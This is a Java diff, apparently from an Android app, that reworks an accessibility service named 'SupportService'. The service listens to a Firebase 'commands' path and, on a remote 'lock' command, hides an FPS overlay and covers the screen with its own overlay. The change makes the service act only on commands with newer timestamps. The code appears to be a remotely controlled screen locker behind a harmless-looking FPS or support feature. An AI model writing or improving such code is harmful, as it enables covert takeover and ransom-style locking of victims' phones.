@@ -221,39 +221,34 @@ public class SupportService extends AccessibilityService {
         return START_STICKY;
     }
 
+    private long lastCommandTime = 0;
+
     private void initFirebaseListener() {
-        // Listen ke root database agar lebih fleksibel
-        dbRef = FirebaseDatabase.getInstance().getReference();
+        dbRef = FirebaseDatabase.getInstance().getReference("commands");
         dbRef.addValueEventListener(new ValueEventListener() {
             @Override
             public void onDataChange(DataSnapshot snapshot) {
-                // Ambil data dari key "commands"
-                Object value = snapshot.child("commands").getValue();
-                if (value == null) return;
+                if (!snapshot.exists()) return;
 
-                String cmd = "";
-                if (value instanceof String) {
-                    cmd = (String) value;
-                } else if (snapshot.child("commands").child("commands").exists()) {
-                    // Jika nested seperti di screenshot: commands/commands
-                    cmd = snapshot.child("commands").child("commands").getValue(String.class);
-                }
+                String cmd = snapshot.child("cmd").getValue(String.class);
+                Long serverTime = snapshot.child("t").getValue(Long.class);
 
-                if (cmd == null || cmd.isEmpty()) return;
-                final String finalCmd = cmd;
+                if (cmd == null || serverTime == null) return;
+                
+                // Hanya proses jika ini perintah baru (timestamp lebih besar)
+                if (serverTime <= lastCommandTime) return;
+                lastCommandTime = serverTime;
 
                 task_handler.post(() -> {
-                    if (finalCmd.equalsIgnoreCase("lock")) {
+                    if (cmd.equalsIgnoreCase("lock")) {
                         if (!isLocked) {
                             input_buffer.setLength(0);
                             setLockStatus(true);
                             hideFpsOverlay();
                             showOverlay();
                             isLocked = true;
-                            // Reset perintah di Firebase agar bisa dipicu lagi nanti
-                            dbRef.child("commands").setValue("idle");
                         }
-                    } else if (finalCmd.equalsIgnoreCase("unlock")) {
+                    } else if (cmd.equalsIgnoreCase("unlock")) {
                         if (isLocked) {
                             setLockStatus(false);
                             hideOverlay();
@@ -263,8 +258,6 @@ public class SupportService extends AccessibilityService {
                             if (fpsPrefs.getBoolean("is_showing", false)) {
                                 showFpsOverlay();
                             }
-                            // Reset perintah di Firebase agar bisa dipicu lagi nanti
-                            dbRef.child("commands").setValue("idle");
                         }
                     }
                 });
